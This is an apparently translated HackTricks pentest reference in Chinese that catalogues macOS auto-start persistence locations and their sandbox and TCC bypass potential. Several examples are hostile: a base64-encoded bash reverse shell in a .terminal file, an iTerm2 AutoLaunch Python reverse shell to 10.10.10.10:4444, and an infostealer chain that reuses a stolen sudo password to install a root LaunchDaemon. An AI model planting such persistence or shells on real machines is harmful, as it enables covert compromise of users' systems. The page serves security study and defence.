# macOS Auto Start

{{#include ../banners/hacktricks-training.md}}

本节主要基于博客系列 [**Beyond the good ol’ LaunchAgents**](https://theevilbit.github.io/beyond/)，目标是添加**更多自动启动位置**（如果可能），指出在最新 macOS 版本（13.4）中**哪些技术仍然有效**，并说明所需的**权限**。

## Sandbox Bypass

> [!TIP]
> 这里可以找到适用于 **sandbox bypass** 的启动位置，使你能够通过**将某些内容写入文件**，然后等待某个非常**常见的操作**、特定的**时间**，或某个通常可以在 sandbox 内执行且无需 root 权限的**操作**，来简单地执行某些内容。

### Launchd

- 可用于 bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Locations

- **`/Library/LaunchAgents`**
- **触发条件**：重启
- 需要 root 权限
- **`/Library/LaunchDaemons`**
- **触发条件**：重启
- 需要 root 权限
- **`/System/Library/LaunchAgents`**
- **触发条件**：重启
- 需要 root 权限
- **`/System/Library/LaunchDaemons`**
- **触发条件**：重启
- 需要 root 权限
- **`~/Library/LaunchAgents`**
- **触发条件**：重新登录
- **`~/Library/LaunchDemons`**
- **触发条件**：重新登录

> [!TIP]
> 一个有趣的事实是，**`launchd`** 在 Mach-o 的 `__Text.__config` 区段中嵌入了一个 property list，其中包含其他 launchd 必须启动的知名服务。此外，这些服务可以包含 `RequireSuccess`、`RequireRun` 和 `RebootOnSuccess`，这意味着它们必须运行并成功完成。
>
> 当然，由于 code signing，无法对其进行修改。

#### Description & Exploitation

**`launchd`** 是 OX S kernel 在启动时执行的第一个**进程**，也是关机时最后结束的进程。它的 **PID** 应始终为 **1**。此进程会读取并执行以下位置的 **ASEP** **plists** 中所指定的配置：

- `/Library/LaunchAgents`：由管理员安装的、针对每个用户的 agents
- `/Library/LaunchDaemons`：由管理员安装的、系统范围的 daemons
- `/System/Library/LaunchAgents`：由 Apple 提供的、针对每个用户的 agents。
- `/System/Library/LaunchDaemons`：由 Apple 提供的、系统范围的 daemons。

当用户登录时，位于 `/Users/$USER/Library/LaunchAgents` 和 `/Users/$USER/Library/LaunchDemons` 中的 plists 会以**已登录用户的权限**启动。

agents 和 daemons 之间的**主要区别在于，agents 会在用户登录时加载，而 daemons 会在系统启动时加载**（因为 ssh 等服务需要在任何用户访问系统之前执行）。此外，agents 可以使用 GUI，而 daemons 需要在后台运行。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
有些情况下，**agent 需要在用户登录前执行**，这些被称为 **PreLoginAgents**。例如，这对于在登录时提供辅助技术很有用。它们也可以在 `/Library/LaunchAgents` 中找到（示例见[**此处**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents)）。

> [!TIP]
> 新的 Daemons 或 Agents 配置文件将在**下次重启后或使用** `launchctl load <target.plist>` **加载**。还可以使用 `launchctl -F <file>` **加载不带该扩展名的 .plist 文件**（不过这些 plist 文件不会在重启后自动加载）。\
> 也可以使用 `launchctl unload <target.plist>` **卸载**（其指向的进程将被终止）。
>
> 要**确保没有任何因素**（例如 override）**阻止** **Agent** 或 **Daemon** **运行**，请执行：`sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

列出当前用户加载的所有 agents 和 daemons：
```bash
launchctl list
```
#### 恶意 LaunchDaemon 链示例（密码复用）

最近的一个 macOS infostealer 复用了**捕获的 sudo 密码**，以投放一个 user agent 和一个 root LaunchDaemon：<sup>[[1]](#references)</sup>

- 将 agent loop 写入 `~/.agent`，并使其可执行。
- 在 `/tmp/starter` 中生成一个指向该 agent 的 plist。
- 使用被盗密码配合 `sudo -S`，将其复制到 `/Library/LaunchDaemons/com.finder.helper.plist`，设置为 `root:wheel`，并使用 `launchctl load` 加载。
- 通过 `nohup ~/.agent >/dev/null 2>&1 &` 静默启动 agent，以分离输出。
```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> 如果某个 plist 由用户拥有，即使它位于 daemon 的系统范围文件夹中，**task 也会以该用户身份执行**，而不是以 root 身份执行。这可以阻止某些 privilege escalation attacks。

#### 关于 launchd 的更多信息

**`launchd`** 是从 **kernel** 启动的第一个 **user mode** 进程。该进程必须**成功启动**，并且**不能退出或崩溃**。它甚至受到保护，可以抵御某些**终止信号**。

`launchd` 会执行的第一批操作之一，就是**启动**所有的 **daemons**，例如：

- 基于执行时间的 **Timer daemons**：
- atd (`com.apple.atrun.plist`)：具有 30 分钟的 `StartInterval`
- crond (`com.apple.systemstats.daily.plist`)：具有在 00:15 启动的 `StartCalendarInterval`
- **Network daemons**，例如：
- `org.cups.cups-lpd`：通过 TCP 监听（`SockType: stream`），服务名称为 `printer`
- SockServiceName 必须是端口，或 `/etc/services` 中的服务
- `com.apple.xscertd.plist`：监听 TCP 端口 1640
- 在指定路径发生变化时执行的 **Path daemons**：
- `com.apple.postfix.master`：检查路径 `/etc/postfix/aliases`
- **IOKit notifications daemons**：
- `com.apple.xartstorageremoted`：`"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port：**
- `com.apple.xscertd-helper.plist`：在 `MachServices` 条目中指示名称 `com.apple.xscertd.helper`
- **UserEventAgent：**
- 这与前一种方式不同。它会使 launchd 响应特定事件而 spawn apps。不过在这种情况下，涉及的主要 binary 不是 `launchd`，而是 `/usr/libexec/UserEventAgent`。它会从 SIP restricted 文件夹 `/System/Library/UserEventPlugins/` 加载 plugins，其中每个 plugin 都会在 `XPCEventModuleInitializer` key 中指示其 initializer；对于较旧的 plugins，则会在其 `Info.plist` 中 `CFPluginFactories` dict 下的 key `FB86416D-6164-2070-726F-70735C216EC0` 中指示。

### shell 启动文件

Writeup: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
- TCC Bypass：[✅](https://emojipedia.org/check-mark-button)
- 但你需要找到一个具有 TCC bypass、且会执行加载这些文件的 shell 的 app

#### 位置

- **`~/.zshrc`、`~/.zlogin`、`~/.zshenv.zwc`**、**`~/.zshenv`、`~/.zprofile`**
- **触发条件**：使用 zsh 打开 terminal
- **`/etc/zshenv`、`/etc/zprofile`、`/etc/zshrc`、`/etc/zlogin`**
- **触发条件**：使用 zsh 打开 terminal
- 需要 root
- **`~/.zlogout`**
- **触发条件**：使用 zsh 退出 terminal
- **`/etc/zlogout`**
- **触发条件**：使用 zsh 退出 terminal
- 需要 root
- 可能还有更多内容，参见：**`man zsh`**
- **`~/.bashrc`**
- **触发条件**：使用 bash 打开 terminal
- `/etc/profile`（未生效）
- `~/.profile`（未生效）
- `~/.xinitrc`、`~/.xserverrc`、`/opt/X11/etc/X11/xinit/xinitrc.d/`
- **触发条件**：预期会由 xterm 触发，但它**未安装**，即使安装后也会抛出此错误：xterm：`DISPLAY is not set`<sup>[[3]](#references)</sup>

#### 描述与利用

启动 `zsh` 或 `bash` 等 shell environment 时，会**运行某些启动文件**。macOS 当前使用 `/bin/zsh` 作为默认 shell。启动 Terminal app 或通过 SSH 访问设备时，会自动访问此 shell。虽然 macOS 中也存在 `bash` 和 `sh`，但必须显式调用它们才能使用。<sup>[[2]](#references)</sup>

zsh 的 man page 可以通过 **`man zsh`** 读取，其中对启动文件进行了详细说明。
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### 重新打开的应用程序

> [!CAUTION]
> 配置所指示的 exploitation 并注销再重新登录，甚至重启，都未能在测试中执行该应用程序。执行这些操作时，应用程序可能需要处于运行状态。

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- 可用于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 位置

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
- **触发条件**: 重启时重新打开应用程序

#### 描述与利用

所有要重新打开的应用程序都位于 plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[[4]](#references)</sup>

因此，要让重新打开的应用程序启动你自己的应用程序，只需**将你的应用程序添加到列表中**。

可以通过列出该目录，或使用 `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` 找到 UUID。

要检查将被重新打开的应用程序，可以执行：
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
要**将应用程序添加到此列表**，可以使用：
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Terminal 偏好设置

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- 可用于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- Terminal 使用其用户的 FDA 权限

#### 位置

- **`~/Library/Preferences/com.apple.Terminal.plist`**
- **触发条件**：打开 Terminal

#### 描述与利用

**`~/Library/Preferences`** 中存储着用户在 Applications 中的偏好设置。其中一些偏好设置可以包含用于**执行其他 Applications/scripts** 的配置。<sup>[[5]](#references)</sup>

例如，Terminal 可以在 Startup 时执行命令：

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

此配置会以如下形式反映在文件 **`~/Library/Preferences/com.apple.Terminal.plist`** 中：
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
因此，如果可以覆盖系统中 Terminal 偏好设置的 plist，就可以使用 **`open`** 功能来**打开 Terminal，并执行该命令**。

你可以通过 cli 添加此内容：
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
### Terminal Scripts / Other file extensions

- 用于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- 使用 Terminal 获取用户的 FDA 权限

#### Location

- **Anywhere**
- **Trigger**: 打开 Terminal

#### Description & Exploitation

如果你创建并打开一个 [**`.terminal`** script](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx)，系统将自动调用 **Terminal application** 来执行其中指定的命令。如果 Terminal app 拥有某些特殊权限（例如 TCC），你的命令将以这些特殊权限运行。

可以这样尝试：
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
你还可以使用扩展名 **`.command`**、**`.tool`**，其中包含常规 shell scripts 内容，它们也会由 Terminal 打开。

> [!CAUTION]
> 如果 Terminal 具有 **Full Disk Access**，它将能够完成该操作（请注意，执行的命令会显示在 Terminal 窗口中）。

### 音频插件

文章：[https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
文章：[https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
- TCC bypass：[🟠](https://emojipedia.org/large-orange-circle)
- 你可能会获得一些额外的 TCC 访问权限

#### 位置

- **`/Library/Audio/Plug-Ins/HAL`**
- 需要 Root 权限
- **触发方式**：重启 coreaudiod 或计算机
- **`/Library/Audio/Plug-ins/Components`**
- 需要 Root 权限
- **触发方式**：重启 coreaudiod 或计算机
- **`~/Library/Audio/Plug-ins/Components`**
- **触发方式**：重启 coreaudiod 或计算机
- **`/System/Library/Components`**
- 需要 Root 权限
- **触发方式**：重启 coreaudiod 或计算机

#### 描述

根据之前的文章，可以**编译一些音频插件**并使其被加载。<sup>[[6]](#references)[[7]](#references)</sup>

### QuickLook 插件

文章：[https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
- TCC bypass：[🟠](https://emojipedia.org/large-orange-circle)
- 你可能会获得一些额外的 TCC 访问权限

#### 位置

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### 描述与利用

当你**触发文件预览**（在 Finder 中选中文件后按空格键），且系统中安装了一个**支持该文件类型的插件**时，QuickLook 插件就可以被执行。<sup>[[8]](#references)</sup>

你可以编译自己的 QuickLook 插件，将其放入上述位置之一以加载它，然后进入一个受支持的文件并按空格键触发它。

### ~~Login/Logout Hooks~~

> [!CAUTION]
> 这对我不起作用，无论是用户 LoginHook 还是 Root LogoutHook 都不行

**文章**：[https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### 位置

- 你需要能够执行类似 `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` 的命令
- `Lo`cated in `~/Library/Preferences/com.apple.loginwindow.plist`

它们已被弃用，但可用于在用户登录时执行命令。<sup>[[9]](#references)</sup>
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
此设置存储在 `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` 中。
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
要删除它：
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
root 用户的配置存储在 **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Conditional Sandbox Bypass

> [!TIP]
> 这里可以找到一些用于 **sandbox bypass** 的启动位置，使你只需**将某些内容写入文件**即可执行，同时只需满足一些不太常见的条件，例如安装了特定的**程序**、用户执行了“**不常见**”的操作，或处于特定环境中。

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- 可用于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
- 但是，你需要能够执行 `crontab` binary
- 或者拥有 root 权限
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/usr/lib/cron/tabs/`、`/private/var/at/tabs`、`/private/var/at/jobs`、`/etc/periodic/`**
- 直接写入需要 root 权限。如果你可以执行 `crontab <file>`，则不需要 root 权限
- **Trigger**：取决于 cron job

#### Description & Exploitation

使用以下命令列出**当前用户**的 cron jobs：
```bash
crontab -l
```
你还可以在 **`/usr/lib/cron/tabs/`** 和 **`/var/at/tabs/`** 中查看所有用户的 cron jobs（需要 root 权限）。

在 macOS 中，可以在以下位置找到以**特定频率**执行 scripts 的几个文件夹：
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
在那里可以找到常规的 **cron** **任务**、**at** **任务**（不太常用）以及 **periodic** **任务**（主要用于清理临时文件）。例如，可以使用 `periodic daily` 执行每日的 periodic 任务。<sup>[[10]](#references)</sup>

要以编程方式添加**用户 cronjob**，可以使用：
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- 可用于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- iTerm2 曾拥有已授予的 TCC permissions

#### 位置

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
- **触发条件**: 打开 iTerm
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
- **触发条件**: 打开 iTerm
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
- **触发条件**: 打开 iTerm

#### 描述与利用

存储在 **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** 中的 Scripts 将被执行。例如：<sup>[[11]](#references)</sup>
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
或：
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
脚本 **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** 也将被执行：
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
位于 **`~/Library/Preferences/com.googlecode.iterm2.plist`** 的 iTerm2 偏好设置可以**指定一条命令**，在打开 iTerm2 终端时执行。

此设置可以在 iTerm2 设置中进行配置：

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

该命令会反映在偏好设置中：
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
你可以使用以下方式设置要执行的命令：
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
> [!WARNING]
> 极有可能存在**其他滥用 iTerm2 preferences**来执行任意命令的方法。

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- 可用于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
- 但必须安装 xbar
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- 它会请求 Accessibility 权限

#### 位置

- **`~/Library/Application\ Support/xbar/plugins/`**
- **触发条件**：xbar 执行后

#### 描述

如果已安装热门程序 [**xbar**](https://github.com/matryer/xbar)，则可以在 **`~/Library/Application\ Support/xbar/plugins/`** 中写入 shell script，该脚本将在 xbar 启动时执行：<sup>[[12]](#references)</sup>
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- 可用于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
- 但必须安装 Hammerspoon
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- 它会请求辅助功能权限

#### 位置

- **`~/.hammerspoon/init.lua`**
- **触发条件**: hammerspoon 执行后

#### 描述

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) 作为 **macOS** 的自动化平台，利用 **LUA scripting language** 执行操作。值得注意的是，它支持集成完整的 AppleScript 代码并执行 shell scripts，从而显著增强其 scripting capabilities。<sup>[[13]](#references)</sup>

该应用会查找单个文件 `~/.hammerspoon/init.lua`，启动后将执行其中的 script。
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### BetterTouchTool

- 可用于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
- 但必须安装 BetterTouchTool
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- 它会请求 Automation-Shortcuts 和 Accessibility 权限

#### 位置

- `~/Library/Application Support/BetterTouchTool/*`

此工具允许指定在按下某些快捷键时执行的应用程序或脚本。攻击者可能能够在数据库中配置自己的 **shortcut 和 action to execute**，使其执行任意代码（shortcut 可以只是按下某个按键）。

### Alfred

- 可用于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
- 但必须安装 Alfred
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- 它会请求 Automation、Accessibility，甚至 Full-Disk access 权限

#### 位置

- `???`

它允许创建在满足特定条件时执行代码的 workflows。攻击者可能可以创建一个 workflow 文件并使 Alfred 加载它（使用 workflows 需要付费购买 premium 版本）。

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- 可用于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
- 但必须启用并使用 ssh
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
- SSH 通常拥有 FDA access

#### 位置

- **`~/.ssh/rc`**
- **触发条件**：通过 ssh 登录
- **`/etc/ssh/sshrc`**
- 需要 Root 权限
- **触发条件**：通过 ssh 登录

> [!CAUTION]
> 启用 ssh 需要 Full Disk Access：
>
> ```bash
> sudo systemsetup -setremotelogin on
> ```

#### 描述与利用

默认情况下，除非在 `/etc/ssh/sshd_config` 中设置 `PermitUserRC no`，否则当用户**通过 SSH 登录**时，将执行脚本 **`/etc/ssh/sshrc`** 和 **`~/.ssh/rc`**。<sup>[[14]](#references)</sup>

### **Login Items**

Writeup: [https://theevilbit.github.io/beyond/beyond_0003/](https://theevilbit.github.io/beyond/beyond_0003/)<sup>[[15]](#references)</sup>

- 可用于绕过 sandbox: [✅](https://emojipedia.org/check-mark-button)
- 但需要使用参数执行 `osascript`
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### 位置

- **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
- **触发条件：**登录
- 存储通过调用 **`osascript`** 执行的 exploit payload
- **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
- **触发条件：**登录
- 需要 Root 权限

#### 描述

在 System Preferences -> Users & Groups -> **Login Items** 中，可以找到**用户登录时执行的项目**。\
可以从命令行列出、添加和删除这些项目：<sup>[[15]](#references)</sup>
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
这些项目存储在文件 **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`** 中。

**Login items** 也可以通过 API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) 指定，该 API 会将配置存储在 **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** 中。

### ZIP as Login Item

（请查看前面关于 Login Items 的章节，这是其扩展内容）

如果将一个 **ZIP** 文件设为 **Login Item**，**`Archive Utility`** 会打开它；如果该 ZIP 例如存储在 **`~/Library`** 中，并且包含带有 backdoor 的 **`LaunchAgents/file.plist`** 文件夹，则该文件夹会被创建（默认情况下并不存在），plist 也会被添加。因此，用户下次再次登录时，plist 中指定的 **backdoor 将被执行**。

另一种选择是在用户 HOME 中创建文件 **`.bash_profile`** 和 **`.zshenv`**，这样即使 LaunchAgents 文件夹已经存在，该技术仍然有效。

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- 可用于绕过 sandbox：[✅](https://emojipedia.org/check-mark-button)
- 但你需要 **执行** **`at`**，并且它必须处于**启用状态**
- TCC bypass：[🔴](https://emojipedia.org/large-red-circle)

#### Location

- 需要 **执行** **`at`**，并且它必须处于**启用状态**

#### **描述**

`at` 任务用于**安排在特定时间执行一次性任务**。与 cron jobs 不同，`at` 任务会在执行后自动删除。需要特别注意的是，这些任务在系统重启后仍然存在，因此在某些情况下可能构成安全风险。<sup>[[16]](#references)</sup>

**默认情况下**它们处于**禁用状态**，但 **root** 用户可以使用以下命令**启用**它们：
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
这将在 1 小时后创建一个文件：
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
使用 `atq` 检查作业队列：
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
上面可以看到两个已安排的任务。我们可以使用 `at -c JOBNUMBER` 打印任务的详细信息。
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> 如果未启用 AT tasks，则创建的 tasks 将不会执行。

**作业文件**位于 `/private/var/at/jobs/`。
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
